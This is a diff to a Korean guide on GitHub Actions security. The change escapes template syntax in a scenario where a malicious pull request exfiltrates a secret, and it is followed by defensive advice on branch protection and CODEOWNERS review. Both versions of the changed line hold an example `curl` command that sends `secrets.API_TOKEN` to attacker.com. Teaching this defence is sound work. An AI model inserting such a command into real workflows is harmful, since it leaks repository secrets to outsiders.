@@ -826,7 +826,7 @@ OS 3개 x Java 4개 x DB 3개 = 36개 Job이 병렬 실행된다. GitHub-hosted 
 
 ### 시나리오 3: Secret 탈취 시도 — 악성 PR에서 시크릿을 외부로 전송
 
-공격자가 PR에서 `curl https://attacker.com/steal?token=${{ secrets.API_TOKEN }}`을 Step에 넣는다. 포크에서 온 PR의 경우 시크릿에 접근할 수 없지만, 같은 저장소 내부의 브랜치에서 온 PR이면 시크릿에 접근 가능하다.
+공격자가 PR에서 `curl https://attacker.com/steal?token=${% raw %}{{ secrets.API_TOKEN }}{% endraw %}`을 Step에 넣는다. 포크에서 온 PR의 경우 시크릿에 접근할 수 없지만, 같은 저장소 내부의 브랜치에서 온 PR이면 시크릿에 접근 가능하다.
 
 **방어 전략:**
 1. Branch Protection Rule에서 `Require approvals`를 설정하여 모든 PR에 코드 리뷰를 필수화한다. Workflow 파일(`.github/workflows/`) 변경은 CODEOWNERS로 보안팀 승인을 요구한다.
